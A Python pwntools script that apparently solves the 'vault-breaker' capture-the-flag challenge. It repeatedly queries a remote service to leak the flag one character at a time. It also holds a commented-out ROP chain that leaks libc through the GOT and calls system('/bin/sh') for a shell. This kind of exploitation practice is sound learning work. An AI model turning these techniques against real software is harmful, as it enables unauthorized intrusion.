from pwn import *
import re
import sys

local_path = "vault-breaker"
full = ""
pty = process.PTY
elf = context.binary = ELF(local_path)
# context.terminal = ['tmux', 'splitw', '-v']
for ij in range(0, 32):
    import time
    time.sleep(2)
    # p = process(elf.path)
    p = remote("138.68.166.146", 30851)

    # gdb.attach(p, gdbscript='''
    # break *new_key_gen+146
    # break *new_key_gen+171
    # break *new_key_gen+179
    # break *new_key_gen+292
    # break *new_key_gen+304
    # # b *secure_password+201
    # # b *secure_password+206
    # # b *secure_password+315
    # # b *secure_password+436
    # # b *secure_password+399

    # continue
    # ''')

    rev1 = p.recvuntil(b"> ")
    #print(rev1[-50:])
    p.sendline(b"1")
    rev2 = p.recvuntil(b"(0-31): ")
    #print(rev2)

    # p.sendline(p64(0xffffffffffffffe))
    p.sendline(f"{ij}".encode())
    rev3 = p.recvuntil(b"> ")
    #print(rev3)
    p.sendline(b"2")

    rev4 = p.recvall()

    for i in range(len(rev4)):
        try:
            temp = hex(rev4[i])
            # print(temp)
        except:
            continue
        try:
            if temp == '0x4d':
                t = chr(rev4[i + 26 + ij + 1])
                print(t)
                full += t
        except:
            pass

print(f"flag: {full}")

#p.interactive()
# pause()
# io.recvuntil(b"(0-31): ")
# io.sendline(b"12")
# io.recvuntil(b"> ")
# io.interactive()

# base = data.split(b"\n")[-2]
# base = u32(base[1:]) << 16
# print(f"current elf base: 0x{base:02x}")

# pop_rdi_ret = 0x0d33
# # 202fa8 <read@GLIBC_2.2.5>
# got_read = 0x202fa8
# puts = 0x760
# return_to_func = 0x0c98

# chain = b'A'*offset
# chain += p64(base + pop_rdi_ret)
# chain += p64(base + got_read)
# chain += p64(base + puts)
# chain += p64(base + return_to_func)

# io.sendline(chain)
# io.recvuntil(b"eset!\x1b[1;34m\n")

# libc_read = u64(io.recv(6) + b'\x00\x00')
# print("leaked read addr: %s"%hex(libc_read))

# # sub read base address from obs to get libc base
# libc_base = libc_read - 0x0f7350

# print(f"libc base: 0x{libc_base:02x}")

# system = libc_base + 0x0453a0 # libcbase + system
# bin_sh = libc_base + 0x18ce57 # libcbase + "/bin/sh"

# io.recvuntil(b'y = ')
# io.sendline(b'')
# io.recvuntil(b'(y/n): ')

# chain = b'A'*offset
# chain += p64(base + pop_rdi_ret)
# chain += p64(bin_sh)
# chain += p64(system)
# print("shell...")
# io.sendline(chain)
# io.interactive()

